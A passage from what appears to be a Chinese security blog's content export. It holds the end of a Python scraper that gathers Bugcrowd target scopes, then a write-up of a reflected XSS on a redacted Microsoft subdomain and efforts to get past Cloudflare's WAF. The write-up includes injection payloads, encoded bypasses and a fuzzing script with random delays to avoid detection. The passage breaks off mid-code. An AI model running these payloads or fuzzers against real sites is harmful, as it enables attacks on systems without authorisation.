class=\"code\"><pre><span class=\"line\">https://bugcrowd.com/programs?vdp[]=false&amp;hidden[]=false&amp;sort[]=promoted-desc</span><br></pre></td></tr></table></figure>\n<p><img src=\"XC26AwADT64p3FM2XD3g3HAOJqumkrl1Jlu1rEUehgM.png\" alt=\"image\"></p>\n<p>使用burp抓包发现，我们只需访问接口：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://bugcrowd.com/programs.json?vdp[]=false&amp;sort[]=promoted-desc&amp;page[]=<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>然后通过更换page[]的参数即可实现换页。而响应包里面的program_url正是打开每一个项目的所对应的URI地址，只需要拼接一下即可访问到项目。</p>\n<p><img src=\"-mFYcTW2ia15VlRt1RpMT-wxHjjToHRRTGz3DW_KiSk.png\" alt=\"image\"></p>\n<p>继续抓包分析发现，我们访问这类的地址：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://bugcrowd.com/program_url/target_groups</span><br></pre></td></tr></table></figure>\n<p>URL格式：<a href=\"https://bugcrowd.com/%E9%A1%B9%E7%9B%AE%E5%90%8D%E7%A7%B0/target/_groups%EF%BC%9B%E4%BA%8E%E6%98%AF%E5%B0%B1%E4%BC%9A%E5%BE%97%E5%88%B0targets/_url%E6%8E%A5%E5%8F%A3\">https://bugcrowd.com/项目名称/target\\_groups；于是就会得到targets\\_url接口</a></p>\n<p><img src=\"iJYj_NYSJMtdwEGcP79TyDOJ42pwdOYMT-JHqjSQCjA.png\" alt=\"image\"></p>\n<p>当我把这个接口拼接上域名访问，即可获得所被测试的目标。响应包中所有的URI即 我们需要的测试目标</p>\n<p><img src=\"0qCr52gQngFaSeKkkMzx1qT4h55BsXiDlE_Ybpk4rBw.png\" alt=\"image\"></p>\n<p>大概三个步骤：</p>\n<p>1.获取每一页的项目，得到项目的program_url</p>\n<p>2.根据每个项目的program_url去请求target_groups，得到接口，接口可能是一个或者两个或者更多</p>\n<p>3.请求上述得到的接口，在响应包里面的uri有我们想要的内容</p>\n<h2 id=\"编写\"><a href=\"#编写\" class=\"headerlink\" title=\"编写\"></a>编写</h2><p>实现请求多个页面获取项目的program_url的代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getTarget</span>():</span><br><span class=\"line\">    <span class=\"comment\">#获取范围从1到9的整数，这里就是1-9页的数据</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">10</span>):</span><br><span class=\"line\">        url = <span class=\"string\">f&#x27;https://bugcrowd.com/programs.json?vdp[]=false&amp;sort[]=promoted-desc&amp;hidden[]=false&amp;page[]=<span class=\"subst\">&#123;i&#125;</span>&#x27;</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;第&quot;</span>+ <span class=\"built_in\">str</span>(i) +<span class=\"string\">&quot;页：&quot;</span>+url)</span><br><span class=\"line\">        <span class=\"comment\"># 请求发送</span></span><br><span class=\"line\">        response = httpx.get(url=url, headers=headers,timeout=<span class=\"literal\">None</span>,verify=<span class=\"literal\">False</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 获取响应数据</span></span><br><span class=\"line\">        json_data = json.loads(response.text)</span><br><span class=\"line\">        <span class=\"comment\">#因为返回的是json，所以比较好处理直接通过for输出我们想要的目标</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> program <span class=\"keyword\">in</span> json_data[<span class=\"string\">&quot;programs&quot;</span>]:</span><br><span class=\"line\">            <span class=\"comment\">#获取了资产（公司）的名称</span></span><br><span class=\"line\">            program_url = program.get(<span class=\"string\">&quot;program_url&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> program_url:</span><br><span class=\"line\">                <span class=\"comment\">#根据资产构建获取URL的api</span></span><br><span class=\"line\">                programUrlEnd = <span class=\"string\">&quot;https://bugcrowd.com&quot;</span> + program_url+<span class=\"string\">&quot;/target_groups&quot;</span></span><br><span class=\"line\">                <span class=\"comment\"># 获取每个目标的Api，如特斯拉的资产Api</span></span><br><span class=\"line\">                getTargetApi(program_url,programUrlEnd)</span><br><span class=\"line\">        <span class=\"comment\">#随机延迟一下，时间是4-15s这个区间</span></span><br><span class=\"line\">        time = random.randint(<span class=\"number\">4</span>,<span class=\"number\">16</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;延迟&quot;</span>+<span class=\"built_in\">str</span>(time)+<span class=\"string\">&quot;s&quot;</span>)</span><br><span class=\"line\">        sleep(time)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n\n<p>实现请求target_groups，得到接口的代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getTargetApi</span>(<span class=\"params\">program_url,url</span>):</span><br><span class=\"line\">    <span class=\"comment\">#根据资产名称的接口获取能够获取资产的API</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;资产名：&quot;</span>+program_url.replace(<span class=\"string\">&quot;/&quot;</span>, <span class=\"string\">&quot;&quot;</span>))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;探测获取API：&quot;</span>+url)</span><br><span class=\"line\">    response = httpx.get(url=url, headers=headers, timeout=<span class=\"literal\">None</span>,verify=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;状态：&quot;</span>+<span class=\"built_in\">str</span>(response.status_code))</span><br><span class=\"line\">    <span class=\"comment\">#如果不能资产名称的接口，就忽略掉，这里只要成功200的</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> response.status_code == <span class=\"number\">200</span>:</span><br><span class=\"line\">        targetApiArry = []</span><br><span class=\"line\">        <span class=\"comment\">#这里是存储了能获取到资产的公司的名称（或项目名称）</span></span><br><span class=\"line\">        programNameArry.append(program_url.replace(<span class=\"string\">&quot;/&quot;</span>, <span class=\"string\">&quot;&quot;</span>))</span><br><span class=\"line\">        <span class=\"comment\">#拿到了获取资产的结果</span></span><br><span class=\"line\">        json_data = json.loads(response.text)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> targets <span class=\"keyword\">in</span> json_data[<span class=\"string\">&quot;groups&quot;</span>]:</span><br><span class=\"line\">            <span class=\"comment\">#也是json格式的数据，我们把想要的拿出来</span></span><br><span class=\"line\">            targets_url = targets.get(<span class=\"string\">&quot;targets_url&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> targets_url:</span><br><span class=\"line\">                targets_url = <span class=\"string\">&quot;https://bugcrowd.com&quot;</span> + targets_url</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Api：&quot;</span>+ targets_url)</span><br><span class=\"line\">                targetApiArry .append(targets_url)</span><br><span class=\"line\">        <span class=\"comment\">#封装为一个字典，每一个资产对应属于自己的接口</span></span><br><span class=\"line\">        targetApiDit[program_url.replace(<span class=\"string\">&quot;/&quot;</span>, <span class=\"string\">&quot;&quot;</span>)] = targetApiArry</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>实现根据资产获取uri的代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getTargetUrl</span>():</span><br><span class=\"line\">    <span class=\"comment\">#遍历我们上面拿到的一个字典，里面存储着项目名称以及能够获取到测试URL的接口</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> key, values <span class=\"keyword\">in</span> targetApiDit.items():</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;当前资产：&quot;</span>+key)</span><br><span class=\"line\">        <span class=\"comment\">#定义一个空数组，循环一次就清空一次，同时下面也会同步写入到一个新的字典里面，实现了每个项目名称所对应的测试URL</span></span><br><span class=\"line\">        TargetUrl = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> value <span class=\"keyword\">in</span> values:</span><br><span class=\"line\">            <span class=\"comment\">#进行请求获取测试URL的API</span></span><br><span class=\"line\">            response = httpx.get(url=value, headers=headers, timeout=<span class=\"literal\">None</span>,verify=<span class=\"literal\">False</span>)</span><br><span class=\"line\">            <span class=\"comment\">#获取响应数据</span></span><br><span class=\"line\">            json_data = json.loads(response.text)</span><br><span class=\"line\">            <span class=\"comment\">#遍历一下，拿到uri</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> uri <span class=\"keyword\">in</span> json_data[<span class=\"string\">&quot;targets&quot;</span>]:</span><br><span class=\"line\">                uri_url = uri.get(<span class=\"string\">&quot;uri&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> uri_url:</span><br><span class=\"line\">                    <span class=\"comment\">#把同一个项目的URI存到这个数组里面</span></span><br><span class=\"line\">                    TargetUrl.append(uri_url)</span><br><span class=\"line\">                    <span class=\"comment\">#把所有的URI都存到这个数组里面，下面直接调用就输出了一个全部URI的txt文件</span></span><br><span class=\"line\">                    MergeTxt.append(uri_url)</span><br><span class=\"line\">        <span class=\"comment\">#根据测试项目做为key，所属项目的测试URI做为value 构造成一个新的字典，下面写到Excel的时候用到</span></span><br><span class=\"line\">        resultXlsxDit[key] = TargetUrl</span><br></pre></td></tr></table></figure>\n<p>实现把所有测试URL写入到txt的代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">outPutMergeTxt</span>():</span><br><span class=\"line\">    <span class=\"comment\"># 打开文本文件进行写入</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;output.txt&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">        <span class=\"comment\"># 将数组中的每个元素写入文本文件的新行中</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> MergeTxt:</span><br><span class=\"line\">            file.write(<span class=\"built_in\">str</span>(item) + <span class=\"string\">&#x27;\\n&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>实现使用panda模块把对应测试项目的URL写入到Excel表格的代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">outPutXlsx</span>():</span><br><span class=\"line\">    <span class=\"comment\"># 将字典转换为DataFrame</span></span><br><span class=\"line\">    df = pd.DataFrame(pd.DataFrame.from_dict(resultXlsxDit, orient=<span class=\"string\">&#x27;index&#x27;</span>).values.T,</span><br><span class=\"line\">                      columns=<span class=\"built_in\">list</span>(resultXlsxDit.keys()))  <span class=\"comment\"># 防止输入的数值长度不一样的时候会崩掉</span></span><br><span class=\"line\">    <span class=\"comment\"># 将DataFrame保存为XLSX文件</span></span><br><span class=\"line\">    df.to_excel(<span class=\"string\">&#x27;output.xlsx&#x27;</span>, engine=<span class=\"string\">&#x27;xlsxwriter&#x27;</span>,index=<span class=\"literal\">False</span>)</span><br></pre></td></tr></table></figure>\n<p>在主函数中进行一次调用即可。</p>\n<p>最终效果：</p>\n<p>所生成的txt</p>\n<p><img src=\"CmsMyjvlC2SagTo1JjFkj5CsRs2suDmjsTpJxMH84v8.png\" alt=\"image\"></p>\n<p>所生成的Excel</p>\n<p><img src=\"f1HtzGs2oqgqVqasOew0So3GkejJ1EsVASmu6BEnZgs.png\" alt=\"image\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>1.目前的不足：所获取到的URL里面有些是下载移动端的链接，如跳转到谷歌或苹果商城的URL，这个后续可以写一段代码进行匹配过滤。</p>\n<p>2.踩坑，一开始打算使用xpath来实现。当我已经实现了获取测试的URL之后，发现这个是异步请求的，如果需要使用xpath的话，就要先把加载好的页面下载到本地之后，才能有完整的数据，最后抓包发现，直接使用接口请求，处理一下json格式的响应包即可。</p>\n","categories":["python"],"tags":["python开发"]},{"title":"记一次艰难的微软某站XSS绕过WAF","url":"/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/","content":"<h1 id=\"记一次艰难的微软某站XSS绕过WAF\"><a href=\"#记一次艰难的微软某站XSS绕过WAF\" class=\"headerlink\" title=\"记一次艰难的微软某站XSS绕过WAF\"></a>记一次艰难的微软某站XSS绕过WAF</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>有一天我去微软官方下载镜像，于是乎我发现了这一个网站存在html的回显且双引号逃逸，经过我的一番研究之后，成功绕过了cloudflare的拦截，历经波折，在此写下文章记录一下。</p>\n<h2 id=\"正文开始\"><a href=\"#正文开始\" class=\"headerlink\" title=\"正文开始\"></a>正文开始</h2><p>当我发现这个链接，给s参数进行传参的时候是有回显的，并且我可以使用双引号闭合</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//xxxxx.microsoft.com/?cat=asclx&amp;email=rvdty&amp;lang=clvwc&amp;p=s2sb8&amp;query=ky1m1&amp;s=%22hellohaha&amp;type=zcyzt&amp;unsubscribe_token=i79hx&amp;url=tewx9</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"mKgWYbCsJQHyiWbZw_0NsLOmSYtujozSJ8KFp54uiHo.png\" alt=\"image\"></p>\n<h2 id=\"尝试使用”-gt-”闭合\"><a href=\"#尝试使用”-gt-”闭合\" class=\"headerlink\" title=\"尝试使用”&gt;”闭合\"></a>尝试使用”&gt;”闭合</h2><p>再尝试使用&gt;进行闭合标签，以失败告终，被过滤了</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//xxxxx.microsoft.com/?s=&quot;&gt;ONclick=alert`1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"Dpay8XELao4VfTCzEt14bDhsRSDtifhGddPXv9Bw7xI.png\" alt=\"image\"></p>\n<p>尝试使用编码绕过；能够正常显示，但还是没闭合标签</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//xxxxx.microsoft.com/?s=%22%26%23%78%30%30%30%30%33%65ONclick=alert%601</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"Ws204n4u3Be03wSr1jd5qJoXZQVbjIImB_wm-w-L7qU.png\" alt=\"image\"></p>\n<p>只能考虑使用h1标签插入事件来触发XSS了；直接输入完整的payload，发现被拦截了</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//xxxxx.microsoft.com/?cat=asclx&amp;email=rvdty&amp;lang=clvwc&amp;p=s2sb8&amp;query=ky1m1&amp;s=%22ONclick=alert(1)&amp;type=zcyzt&amp;unsubscribe_token=i79hx&amp;url=tewx9</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"zKMGCKgzM4Cp0g6UMNG2nSEJ3Gs_cgP8lsTtfzCpCao.png\" alt=\"image\"></p>\n<p>我把多余的传参删掉，继续测试</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//xxxxx.microsoft.com/?s=%22ONclick=alert1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"9f7y4VTXltHE5Xu6DwrXyFB2rhH-xn__54UtuUFtPWE.png\" alt=\"image\"></p>\n<h2 id=\"尝试”-“绕过\"><a href=\"#尝试”-“绕过\" class=\"headerlink\" title=\"尝试”`“绕过\"></a>尝试”`“绕过</h2><p>圆括号被拦截，换成`</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">没拦截   https:<span class=\"comment\">//xxxxx.microsoft.com/?s=%22ONclick=alert`1</span></span><br><span class=\"line\">拦截    https:<span class=\"comment\">//xxxxx.microsoft.com/?s=%22ONclick=alert`1`</span></span><br><span class=\"line\">没拦截  https:<span class=\"comment\">//xxxxx.microsoft.com/?s=%22ONclic=alert`1`</span></span><br></pre></td></tr></table></figure>\n<p>综合上述的那个payload发现，其实如果没有出现鼠标或者其它事件的触发函数的话，是可以正常使用反引号的，于是乎我开始fuzz能够触发的函数</p>\n<p>用python写了一个脚本进行fuzz，事件的话使用网上搜索到的。为什么我不直接使用burp的lntruder来枚举呢？因为延迟不好设置，避免容易被waf拦截，我使用python可以实现了随机延迟来进行fuzz</p>\n<p>python脚本</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"></span><br><span class=\"line\"># 读取参数文件</span><br><span class=\"line\">with <span class=\"title function_\">open</span><span class=\"params\">(<span class=\"string\">&#x27;1.txt&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>)</span> as file:</span><br><span class=\"line\">    lines = file.readlines()</span><br><span class=\"line\"></span><br><span class=\"line\"># 循环发送请求</span><br><span class=\"line\"><span class=\"keyword\">for</span> line in lines:</span><br><span class=\"line\">    parameter = line.strip()  # 去除换行符和空格</span><br><span class=\"line\">    url = f<span class=\"string\">&quot;https://xxxx.microsoft.com/?s=%22&#123;parameter&#125;=confirm%602%60%20&quot;</span></span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0&#x27;</span>  # 替换为你自己的User-Agent字符串</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    # 发送GET请求</span><br><span class=\"line\">    response = requests.get(url, headers=headers)</span><br><span class=\"line\">    # 打印响应状态码</span><br><span class=\"line\">    print(f<span class=\"string\">&quot;请求URL: &#123;url&#125;&quot;</span>)</span><br><span class=\"line\">    print(f<span class=\"string\">&quot;响应状态码: &#123;response.status_code&#125;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    # 延迟x秒</span><br><span class=\"line\">    delay = random.uniform(<span class=\"number\">3</span>, <span class=\"number\">9</span>)</span><br><span class=\"line\">    time.sleep(delay)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"fuzz事件函数\"><a href=\"#fuzz事件函数\" class=\"headerlink\" title=\"fuzz事件函数\"></a>fuzz事件函数</h2><p>事件函数</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"> FSCommand() (攻击者当需要在嵌入的Flash对象中执行时可以使用此事件)</span><br><span class=\"line\"> onAbort() (当用户中止加载图片时)</span><br><span class=\"line\"> onActivate() (当对象激活时)</span><br><span class=\"line\"> onAfterPrint() (用户打印或进行打印预览后触发)</span><br><span class=\"line\"> onAfterUpdate() (从数据源对象更新数据后由数据对象触发)</span><br><span class=\"line\"> onBeforeActivate() (在对象设置为激活元素前触发)</span><br><span class=\"line\"> onBeforeCopy() (攻击者在选中部分拷贝到剪贴板前执行攻击代码-攻击者可以通过执行execCommand(<span class=\"string\">&quot;Copy&quot;</span>)函数触发)</span><br><span class=\"line\"> onBeforeCut() (攻击者在选中部分剪切到剪贴板前执行攻击代码)</span><br><span class=\"line\"> onBeforeDeactivate() (在当前对象的激活元素变化前触发)</span><br><span class=\"line\">onBeforeEditFocus() (在一个包含可编辑元素的对象进入激活状态时或一个可编辑的对象被选中时触发)</span><br><span class=\"line\">onBeforePaste() (在用户被诱导进行粘贴前或使用execCommand(<span class=\"string\">&quot;Paste&quot;</span>)函数触发)</span><br><span class=\"line\">onBeforeUnload() (用户需要被诱导关闭浏览器-除非从父窗口执行，否则攻击者不能关闭当前窗口)</span><br><span class=\"line\">onBeforeUpdate() (从数据源对象更新数据前由数据对象触发)</span><br><span class=\"line\">onBegin() (当元素周期开始时由onbegin 事件立即触发)</span><br><span class=\"line\">onBlur() (另一个窗口弹出当前窗口失去焦点时触发)</span><br><span class=\"line\">onBounce() (当marquee对象的behavior属性设置为“alternate”且字幕的滚动内容到达窗口一边时触发)</span><br><span class=\"line\">onCellChange() (当数据提供者的数据变化时触发)</span><br><span class=\"line\">onChange() (select，text, 或TEXTAREA字段失去焦点并且值发生变化时触发)</span><br><span class=\"line\">onClick() (表单中点击触发)</span><br><span class=\"line\">onContextMenu() (用户需要在攻击区域点击右键)</span><br><span class=\"line\">onControlSelect() (当用户在一个对象上创建控件选中区时触发)</span><br><span class=\"line\">onCopy() (用户需要复制一些东西或使用execCommand(<span class=\"string\">&quot;Copy&quot;</span>)命令时触发)</span><br><span class=\"line\">onCut() (用户需要剪切一些东西或使用execCommand(<span class=\"string\">&quot;Cut&quot;</span>)命令时触发)</span><br><span class=\"line\">onDataAvailable() (用户需要修改元素中的数据，或者由攻击者提供的类似功能)</span><br><span class=\"line\">onDataSetChanged() (当数据源对象变更导致数据集发生变更时触发)</span><br><span class=\"line\">onDataSetComplete() (数据源对象中所有数据可用时触发)</span><br><span class=\"line\">onDblClick() (用户双击一个表单元素或链接)</span><br><span class=\"line\">onDeactivate() (在激活元素从当前对象转换到父文档中的另一个对象时触发)</span><br><span class=\"line\">onDrag() (在元素正在拖动时触发)</span><br><span class=\"line\">onDragEnd() (当用户完成元素的拖动时触发)</span><br><span class=\"line\">onDragLeave() (用户在拖动元素离开放置目标时触发)</span><br><span class=\"line\">onDragEnter() (用户将对象拖拽到合法拖曳目标)</span><br><span class=\"line\">onDragOver() (用户将对象拖拽划过合法拖曳目标)</span><br><span class=\"line\">onDragDrop() (用户将一个对象（例如文件）拖拽到浏览器窗口)</span><br><span class=\"line\">onDragStart() (当用户开始拖动元素时触发)</span><br><span class=\"line\">onDrop() (当拖动元素放置在目标区域时触发)</span><br><span class=\"line\">onEnded() (在视频/音频（audio/video）播放结束时触发)</span><br><span class=\"line\">onError() (在加载文档或图像时发生错误)</span><br><span class=\"line\">onErrorUpdate() (当从数据源对象更新相关数据遇到错误时在数据绑定对象上触发)</span><br><span class=\"line\">onFilterChange() (当滤镜完成状态变更时触发)</span><br><span class=\"line\">onFinish() (当marquee完成滚动时攻击者可以执行攻击)</span><br><span class=\"line\">onFocus() (当窗口获得焦点时攻击者可以执行攻击代码)</span><br><span class=\"line\">onFocusIn() (当元素将要被设置为焦点之前触发)</span><br><span class=\"line\">onFocusOut() (攻击者可以在窗口失去焦点时触发攻击代码)</span><br><span class=\"line\">onHashChange() (当锚部分发生变化时触发攻击代码)</span><br><span class=\"line\">onHelp() (攻击者可以在用户在当前窗体激活时按下F1触发攻击代码)</span><br><span class=\"line\">onInput() (在 &lt;input&gt; 或 &lt;textarea&gt; 元素的值发生改变时触发)</span><br><span class=\"line\">onKeyDown() (用户按下一个键的时候触发)</span><br><span class=\"line\">onKeyPress() (在键盘按键被按下并释放一个键时触发)</span><br><span class=\"line\">onKeyUp() (用户释放一个键时触发)</span><br><span class=\"line\">onLayoutComplete() (用户进行完打印或打印预览时触发)</span><br><span class=\"line\">onLoad() (攻击者在窗口加载后触发攻击代码)</span><br><span class=\"line\">onLoseCapture() (可以由releaseCapture()方法触发)</span><br><span class=\"line\">onMediaComplete() (当一个流媒体文件使用时，这个事件可以在文件播放前触发)</span><br><span class=\"line\">onMediaError() (当用户在浏览器中打开一个包含媒体文件的页面，出现问题时触发事件)</span><br><span class=\"line\">onMessage() (当页面收到一个信息时触发事件)</span><br><span class=\"line\">onMouseDown() (攻击者需要让用户点击一个图片触发事件)</span><br><span class=\"line\">onMouseEnter() (光标移动到一个对象或区域时触发)</span><br><span class=\"line\">onMouseLeave() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件)</span><br><span class=\"line\">onMouseMove() (攻击者需要让用户将光标移到一个图片或表格)</span><br><span class=\"line\">onMouseOut() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件)</span><br><span class=\"line\">onMouseOver() (光标移动到一个对象或区域)</span><br><span class=\"line\">onMouseUp() (攻击者需要让用户点击一个图片)</span><br><span class=\"line\">onMouseWheel() (攻击者需要让用户使用他们的鼠标滚轮)</span><br><span class=\"line\">onMove() (用户或攻击者移动页面时触发)</span><br><span class=\"line\">onMoveEnd() (用户或攻击者移动页面结束时触发)</span><br><span class=\"line\">onMoveStart() (用户或攻击者开始移动页面时触发)</span><br><span class=\"line\">onOffline() (当浏览器从在线模式切换到离线模式时触发)</span><br><span class=\"line\">onOnline() (当浏览器从离线模式切换到在线模式时触发)</span><br><span class=\"line\">onOutOfSync() (当元素与当前时间线失去同步时触发)</span><br><span class=\"line\">onPaste() (用户进行粘贴时或攻击者可以使用execCommand(<span class=\"string\">&quot;Paste&quot;</span>)函数时触发)</span><br><span class=\"line\">onPause() (在视频或音频暂停时触发)</span><br><span class=\"line\">onPopState() (在窗口的浏览历史（history 对象）发生改变时触发)</span><br><span class=\"line\">onProgress() (攻击者可以在一个FLASH加载时触发事件)</span><br><span class=\"line\">onPropertyChange() (用户或攻击者需要改变元素属性时触发)</span><br><span class=\"line\">onReadyStateChange() (每次 readyState 属性变化时被自动调用)</span><br><span class=\"line\">onRedo() (用户返回上一页面时触发)</span><br><span class=\"line\">onRepeat() (事件在播放完重复播放时触发)</span><br><span class=\"line\">onReset() (用户或攻击者重置表单时触发)</span><br><span class=\"line\">resizeTo(<span class=\"number\">500</span>,<span class=\"number\">400</span>);&lt;/SCRIPT&gt;)</span><br><span class=\"line\">onResizeEnd() (用户完成改变窗体大小时触发)</span><br><span class=\"line\">onResizeStart() (用户开始改变窗体大小时触发)</span><br><span class=\"line\">onResume() (当元素继续播放时触发)</span><br><span class=\"line\">onReverse() (当元素回放时触发)</span><br><span class=\"line\">onRowsEnter() (用户或攻击者需要改变数据源中的一行)</span><br><span class=\"line\">onRowExit() (用户或攻击者改变数据源中的一行后退出时触发)</span><br><span class=\"line\">onRowDelete() (用户或攻击者需要删除数据源中的一行)</span><br><span class=\"line\">onRowInserted() (user or attacker would needto insert a row in a data source)</span><br><span class=\"line\">onScroll() (用户需要滚动或攻击者使用scrollBy()函数)</span><br><span class=\"line\">onSeek() (当用户在元素上执行查找操作时触发)</span><br><span class=\"line\">execCommand(<span class=\"string\">&quot;SelectAll&quot;</span>);)</span><br><span class=\"line\">execCommand(<span class=\"string\">&quot;SelectAll&quot;</span>);)</span><br><span class=\"line\">execCommand(<span class=\"string\">&quot;SelectAll&quot;</span>);)</span><br><span class=\"line\">onStart() (在marquee 对象开始循环时触发)</span><br><span class=\"line\">onStop() (当用户按下停止按钮或离开页面时触发)</span><br><span class=\"line\">onStorage() (当Web Storage更新时触发)</span><br><span class=\"line\">onSyncRestored() (当元素与它的时间线恢复同步时触发)</span><br><span class=\"line\">onSubmit() (需要用户或攻击者提交表单)</span><br><span class=\"line\">onTimeError() (用户或攻击者设置时间属性出现错误时触发)</span><br><span class=\"line\">onTrackChange() (用户或攻击者改变播放列表内歌曲时触发)</span><br><span class=\"line\">onUndo() (用户返回上一浏览记录页面时触发)</span><br><span class=\"line\">onUnload() (用户点击任意链接或按下后退按钮或攻击者强制进行点击时触发)</span><br><span class=\"line\">onURLFlip() (当一个高级流媒体格式（ASF）文件，由一个HTML+TIME（基于时间交互的多媒体扩展）媒体标签播放时，可触发在ASF文件中内嵌的攻击脚本)</span><br><span class=\"line\">seekSegmentTime() (这是一个方法可以定位元素某个时间段内中的特定的点，并可以从该点播放。这个段落包含了一个重复的时间线，并包括使用AUTOREVERSE属性进行反向播放。)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<p>测了一圈下来，基本上都是403（403则是被waf拦截）</p>\n<p><img src=\"Je7xbhQnJAlkaNWQQ60fjS7RiO07AtbBorAUeKBnrQs.png\" alt=\"image\"></p>\n<p>只剩下这几个是200，可以过waf的；但是这几个函数都不适合用在h1标签上，大小写也测试过了，于是使用事件触发这个思路算是走不通了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">onOnline</span><br><span class=\"line\">seekSegmentTime</span><br><span class=\"line\">FSCommand</span><br></pre></td></tr></table></figure>\n<h2 id=\"尝试绕过弹窗函数\"><a href=\"#尝试绕过弹窗函数\" class=\"headerlink\" title=\"尝试绕过弹窗函数\"></a>尝试绕过弹窗函数</h2><p>于是尝试从弹窗函数和反引号入手，首先是弹窗函数，常用的alert、confirm和 prompt均被拦截。</p>\n<p>尝试使用Unicode编码的弹窗函数</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Onclick    \\u0061\\u006C\\u0065\\u0072\\u0074</span><br><span class=\"line\"></span><br><span class=\"line\">html编码且去掉分号  </span><br><span class=\"line\">&amp;#x5c&amp;#x75&amp;#x30&amp;#x30&amp;#x36&amp;#x31&amp;#x5c&amp;#x75&amp;#x30&amp;#x30&amp;#x36&amp;#x43&amp;#x5c&amp;#x75&amp;#x30&amp;#x30&amp;#x36&amp;#x35&amp;#x5c&amp;#x75&amp;#x30&amp;#x30&amp;#x37&amp;#x32&amp;#x5c&amp;#x75&amp;#x30&amp;#x30&amp;#x37&amp;#x34</span><br><span class=\"line\"></span><br><span class=\"line\"> 再进行URL编码进行请求</span><br><span class=\"line\">%<span 